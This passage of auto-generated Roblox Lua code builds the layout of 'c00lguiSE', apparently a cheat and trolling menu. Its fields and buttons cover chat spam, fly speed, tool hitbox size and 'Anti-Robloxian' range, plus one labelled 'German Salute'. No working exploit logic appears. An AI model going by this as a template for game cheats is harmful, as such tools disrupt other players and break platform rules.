G2L["db"]["BorderSizePixel"] = 2;
G2L["db"]["TextWrapped"] = true;
G2L["db"]["TextSize"] = 14;
G2L["db"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["db"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["db"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["db"]["PlaceholderText"] = [[Gravity]];
G2L["db"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["db"]["Position"] = UDim2.new(0.04983, 0, 0.075, 0);
G2L["db"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["db"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.ChatSpamInput
G2L["dc"] = Instance.new("TextBox", G2L["d7"]);
G2L["dc"]["Name"] = [[ChatSpamInput]];
G2L["dc"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["dc"]["BorderSizePixel"] = 2;
G2L["dc"]["TextWrapped"] = true;
G2L["dc"]["TextSize"] = 14;
G2L["dc"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["dc"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["dc"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["dc"]["PlaceholderText"] = [[Chat Spam Text]];
G2L["dc"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["dc"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["dc"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["dc"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.SpamWaitInput
G2L["dd"] = Instance.new("TextBox", G2L["d7"]);
G2L["dd"]["Name"] = [[SpamWaitInput]];
G2L["dd"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["dd"]["BorderSizePixel"] = 2;
G2L["dd"]["TextWrapped"] = true;
G2L["dd"]["TextSize"] = 14;
G2L["dd"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["dd"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["dd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["dd"]["PlaceholderText"] = [[Spam Cooldown]];
G2L["dd"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["dd"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["dd"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["dd"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.AssetInput
G2L["de"] = Instance.new("TextBox", G2L["d7"]);
G2L["de"]["Name"] = [[AssetInput]];
G2L["de"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["de"]["BorderSizePixel"] = 2;
G2L["de"]["TextWrapped"] = true;
G2L["de"]["TextSize"] = 14;
G2L["de"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["de"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["de"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["de"]["PlaceholderText"] = [[Asset ID]];
G2L["de"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["de"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["de"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["de"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.ARRangeInput
G2L["df"] = Instance.new("TextBox", G2L["d7"]);
G2L["df"]["Name"] = [[ARRangeInput]];
G2L["df"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["df"]["BorderSizePixel"] = 2;
G2L["df"]["TextWrapped"] = true;
G2L["df"]["TextSize"] = 14;
G2L["df"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["df"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["df"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["df"]["PlaceholderText"] = [[Anti-Robloxian Range]];
G2L["df"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["df"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["df"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["df"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.FlySpeedInput
G2L["e0"] = Instance.new("TextBox", G2L["d7"]);
G2L["e0"]["Name"] = [[FlySpeedInput]];
G2L["e0"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["e0"]["BorderSizePixel"] = 2;
G2L["e0"]["TextWrapped"] = true;
G2L["e0"]["TextSize"] = 14;
G2L["e0"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["e0"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["e0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e0"]["PlaceholderText"] = [[Fly Speed]];
G2L["e0"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["e0"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["e0"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["e0"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.ToolHitboxInput
G2L["e1"] = Instance.new("TextBox", G2L["d7"]);
G2L["e1"]["Name"] = [[ToolHitboxInput]];
G2L["e1"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["e1"]["BorderSizePixel"] = 2;
G2L["e1"]["TextWrapped"] = true;
G2L["e1"]["TextSize"] = 14;
G2L["e1"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["e1"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["e1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e1"]["PlaceholderText"] = [[Tool Hitbox]];
G2L["e1"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["e1"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["e1"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["e1"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.AnimationIDInput
G2L["e2"] = Instance.new("TextBox", G2L["d7"]);
G2L["e2"]["Name"] = [[AnimationIDInput]];
G2L["e2"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["e2"]["BorderSizePixel"] = 2;
G2L["e2"]["TextWrapped"] = true;
G2L["e2"]["TextSize"] = 14;
G2L["e2"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["e2"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["e2"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e2"]["PlaceholderText"] = [[Animation ID]];
G2L["e2"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["e2"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["e2"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["e2"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.AnimationSpeedInput
G2L["e3"] = Instance.new("TextBox", G2L["d7"]);
G2L["e3"]["Name"] = [[AnimationSpeedInput]];
G2L["e3"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["e3"]["BorderSizePixel"] = 2;
G2L["e3"]["TextWrapped"] = true;
G2L["e3"]["TextSize"] = 14;
G2L["e3"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["e3"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["e3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e3"]["PlaceholderText"] = [[Animation Speed]];
G2L["e3"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["e3"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["e3"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["e3"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.SpinSpeedInput
G2L["e4"] = Instance.new("TextBox", G2L["d7"]);
G2L["e4"]["Name"] = [[SpinSpeedInput]];
G2L["e4"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["e4"]["BorderSizePixel"] = 2;
G2L["e4"]["TextWrapped"] = true;
G2L["e4"]["TextSize"] = 14;
G2L["e4"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["e4"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["e4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e4"]["PlaceholderText"] = [[Spin Speed]];
G2L["e4"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["e4"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["e4"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["e4"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.OrbitSpeedInput
G2L["e5"] = Instance.new("TextBox", G2L["d7"]);
G2L["e5"]["Name"] = [[OrbitSpeedInput]];
G2L["e5"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["e5"]["BorderSizePixel"] = 2;
G2L["e5"]["TextWrapped"] = true;
G2L["e5"]["TextSize"] = 14;
G2L["e5"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["e5"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["e5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e5"]["PlaceholderText"] = [[Orbit Speed]];
G2L["e5"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["e5"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["e5"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["e5"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Settings.OrbitRadiusInput
G2L["e6"] = Instance.new("TextBox", G2L["d7"]);
G2L["e6"]["Name"] = [[OrbitRadiusInput]];
G2L["e6"]["PlaceholderColor3"] = Color3.fromRGB(156, 0, 0);
G2L["e6"]["BorderSizePixel"] = 2;
G2L["e6"]["TextWrapped"] = true;
G2L["e6"]["TextSize"] = 14;
G2L["e6"]["TextColor3"] = Color3.fromRGB(255, 51, 0);
G2L["e6"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["e6"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e6"]["PlaceholderText"] = [[Orbit Radius]];
G2L["e6"]["Size"] = UDim2.new(0, 114, 0, 25);
G2L["e6"]["Position"] = UDim2.new(0.38076, 0, 0.075, 0);
G2L["e6"]["BorderColor3"] = Color3.fromRGB(21, 21, 21);
G2L["e6"]["Text"] = [[]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts
G2L["e7"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["e7"]["Visible"] = false;
G2L["e7"]["Active"] = true;
G2L["e7"]["BorderSizePixel"] = 0;
G2L["e7"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["e7"]["Name"] = [[Scripts]];
G2L["e7"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["e7"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["e7"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["e7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e7"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Scripts.UIListLayout
G2L["e8"] = Instance.new("UIListLayout", G2L["e7"]);
G2L["e8"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
G2L["e8"]["HorizontalFlex"] = Enum.UIFlexAlignment.SpaceEvenly;
G2L["e8"]["Wraps"] = true;
G2L["e8"]["Padding"] = UDim.new(0.01, 0);
G2L["e8"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
G2L["e8"]["FillDirection"] = Enum.FillDirection.Horizontal;


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["e9"] = Instance.new("TextButton", G2L["e7"]);
G2L["e9"]["TextWrapped"] = true;
G2L["e9"]["BorderSizePixel"] = 0;
G2L["e9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["e9"]["TextSize"] = 15;
G2L["e9"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["e9"]["RichText"] = true;
G2L["e9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["e9"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["e9"]["Name"] = [[Button]];
G2L["e9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["e9"]["Text"] = [[Glitch Sounds: OFF]];
G2L["e9"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["ea"] = Instance.new("LocalScript", G2L["e9"]);
G2L["ea"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["eb"] = Instance.new("TextButton", G2L["e7"]);
G2L["eb"]["TextWrapped"] = true;
G2L["eb"]["BorderSizePixel"] = 0;
G2L["eb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["eb"]["TextSize"] = 15;
G2L["eb"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["eb"]["RichText"] = true;
G2L["eb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["eb"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["eb"]["Name"] = [[Button]];
G2L["eb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["eb"]["Text"] = [[Mute Sounds: OFF]];
G2L["eb"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["ec"] = Instance.new("LocalScript", G2L["eb"]);
G2L["ec"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["ed"] = Instance.new("TextButton", G2L["e7"]);
G2L["ed"]["TextWrapped"] = true;
G2L["ed"]["BorderSizePixel"] = 0;
G2L["ed"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ed"]["TextSize"] = 15;
G2L["ed"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["ed"]["RichText"] = true;
G2L["ed"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ed"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["ed"]["Name"] = [[Button]];
G2L["ed"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ed"]["Text"] = [[Sing Electro Sp00k]];
G2L["ed"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["ee"] = Instance.new("LocalScript", G2L["ed"]);
G2L["ee"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["ef"] = Instance.new("TextButton", G2L["e7"]);
G2L["ef"]["TextWrapped"] = true;
G2L["ef"]["BorderSizePixel"] = 0;
G2L["ef"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ef"]["TextSize"] = 15;
G2L["ef"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["ef"]["RichText"] = true;
G2L["ef"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ef"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["ef"]["Name"] = [[Button]];
G2L["ef"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ef"]["Text"] = [[Sing RickRoll]];
G2L["ef"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["f0"] = Instance.new("LocalScript", G2L["ef"]);
G2L["f0"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["f1"] = Instance.new("TextButton", G2L["e7"]);
G2L["f1"]["TextWrapped"] = true;
G2L["f1"]["BorderSizePixel"] = 0;
G2L["f1"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f1"]["TextSize"] = 15;
G2L["f1"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["f1"]["RichText"] = true;
G2L["f1"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f1"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["f1"]["Name"] = [[Button]];
G2L["f1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f1"]["Text"] = [[Commit oof]];
G2L["f1"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["f2"] = Instance.new("LocalScript", G2L["f1"]);
G2L["f2"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["f3"] = Instance.new("TextButton", G2L["e7"]);
G2L["f3"]["TextWrapped"] = true;
G2L["f3"]["BorderSizePixel"] = 0;
G2L["f3"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f3"]["TextSize"] = 15;
G2L["f3"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["f3"]["RichText"] = true;
G2L["f3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f3"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["f3"]["Name"] = [[Button]];
G2L["f3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f3"]["Text"] = [[Car]];
G2L["f3"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["f4"] = Instance.new("LocalScript", G2L["f3"]);
G2L["f4"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["f5"] = Instance.new("TextButton", G2L["e7"]);
G2L["f5"]["TextWrapped"] = true;
G2L["f5"]["BorderSizePixel"] = 0;
G2L["f5"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f5"]["TextSize"] = 15;
G2L["f5"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["f5"]["RichText"] = true;
G2L["f5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f5"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["f5"]["Name"] = [[Button]];
G2L["f5"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f5"]["Text"] = [[Backflip]];
G2L["f5"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["f6"] = Instance.new("LocalScript", G2L["f5"]);
G2L["f6"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["f7"] = Instance.new("TextButton", G2L["e7"]);
G2L["f7"]["TextWrapped"] = true;
G2L["f7"]["BorderSizePixel"] = 0;
G2L["f7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f7"]["TextSize"] = 15;
G2L["f7"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["f7"]["RichText"] = true;
G2L["f7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f7"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["f7"]["Name"] = [[Button]];
G2L["f7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f7"]["Text"] = [[Hamster Ball]];
G2L["f7"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["f8"] = Instance.new("LocalScript", G2L["f7"]);
G2L["f8"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["f9"] = Instance.new("TextButton", G2L["e7"]);
G2L["f9"]["TextWrapped"] = true;
G2L["f9"]["BorderSizePixel"] = 0;
G2L["f9"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["f9"]["TextSize"] = 15;
G2L["f9"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["f9"]["RichText"] = true;
G2L["f9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["f9"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["f9"]["Name"] = [[Button]];
G2L["f9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["f9"]["Text"] = [[German Salute]];
G2L["f9"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["fa"] = Instance.new("LocalScript", G2L["f9"]);
G2L["fa"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["fb"] = Instance.new("TextButton", G2L["e7"]);
G2L["fb"]["TextWrapped"] = true;
G2L["fb"]["BorderSizePixel"] = 0;
G2L["fb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fb"]["TextSize"] = 15;
G2L["fb"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["fb"]["RichText"] = true;
G2L["fb"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["fb"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["fb"]["Name"] = [[Button]];
G2L["fb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fb"]["Text"] = [[Part Orbit]];
G2L["fb"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["fc"] = Instance.new("LocalScript", G2L["fb"]);
G2L["fc"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["fd"] = Instance.new("TextButton", G2L["e7"]);
G2L["fd"]["TextWrapped"] = true;
G2L["fd"]["BorderSizePixel"] = 0;
G2L["fd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["fd"]["TextSize"] = 15;
G2L["fd"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["fd"]["RichText"] = true;
G2L["fd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["fd"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["fd"]["Name"] = [[Button]];
G2L["fd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["fd"]["Text"] = [[KrystalDance V4]];
G2L["fd"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["fe"] = Instance.new("LocalScript", G2L["fd"]);
G2L["fe"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["ff"] = Instance.new("TextButton", G2L["e7"]);
G2L["ff"]["TextWrapped"] = true;
G2L["ff"]["BorderSizePixel"] = 0;
G2L["ff"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["ff"]["TextSize"] = 15;
G2L["ff"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["ff"]["RichText"] = true;
G2L["ff"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["ff"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["ff"]["Name"] = [[Button]];
G2L["ff"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ff"]["Text"] = [[Seraphic Blade]];
G2L["ff"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["100"] = Instance.new("LocalScript", G2L["ff"]);
G2L["100"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["101"] = Instance.new("TextButton", G2L["e7"]);
G2L["101"]["TextWrapped"] = true;
G2L["101"]["BorderSizePixel"] = 0;
G2L["101"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["101"]["TextSize"] = 15;
G2L["101"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["101"]["RichText"] = true;
G2L["101"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["101"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["101"]["Name"] = [[Button]];
G2L["101"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["101"]["Text"] = [[Zombie]];
G2L["101"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["102"] = Instance.new("LocalScript", G2L["101"]);
G2L["102"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["103"] = Instance.new("TextButton", G2L["e7"]);
G2L["103"]["TextWrapped"] = true;
G2L["103"]["BorderSizePixel"] = 0;
G2L["103"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["103"]["TextSize"] = 15;
G2L["103"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["103"]["RichText"] = true;
G2L["103"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["103"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["103"]["Name"] = [[Button]];
G2L["103"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["103"]["Text"] = [[SCP-096]];
G2L["103"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["104"] = Instance.new("LocalScript", G2L["103"]);
G2L["104"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button
G2L["105"] = Instance.new("TextButton", G2L["e7"]);
G2L["105"]["TextWrapped"] = true;
G2L["105"]["BorderSizePixel"] = 0;
G2L["105"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["105"]["TextSize"] = 15;
G2L["105"]["BackgroundColor3"] = Color3.fromRGB(255, 51, 0);
G2L["105"]["RichText"] = true;
G2L["105"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["105"]["Size"] = UDim2.new(0, 85, 0, 38);
G2L["105"]["Name"] = [[Button]];
G2L["105"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["105"]["Text"] = [[John Doe]];
G2L["105"]["Position"] = UDim2.new(0, 0, 0.125, 0);


-- StarterGui.c00lguiSE.Main.Pages.Scripts.Button.ButtonScript
G2L["106"] = Instance.new("LocalScript", G2L["105"]);
G2L["106"]["Name"] = [[ButtonScript]];


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs
G2L["107"] = Instance.new("ScrollingFrame", G2L["25"]);
G2L["107"]["Visible"] = false;
G2L["107"]["Active"] = true;
G2L["107"]["BorderSizePixel"] = 0;
G2L["107"]["CanvasPosition"] = Vector2.new(0, 103.33333);
G2L["107"]["BackgroundColor3"] = Color3.fromRGB(36, 36, 36);
G2L["107"]["Name"] = [[Admin Commands/GUIs]];
G2L["107"]["Size"] = UDim2.new(0, 388, 0, 200);
G2L["107"]["ScrollBarImageColor3"] = Color3.fromRGB(255, 51, 0);
G2L["107"]["Position"] = UDim2.new(0.0198, 0, 0.168, 0);
G2L["107"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["107"]["ScrollBarThickness"] = 3;


-- StarterGui.c00lguiSE.Main.Pages.Admin Commands/GUIs.UIListLayout
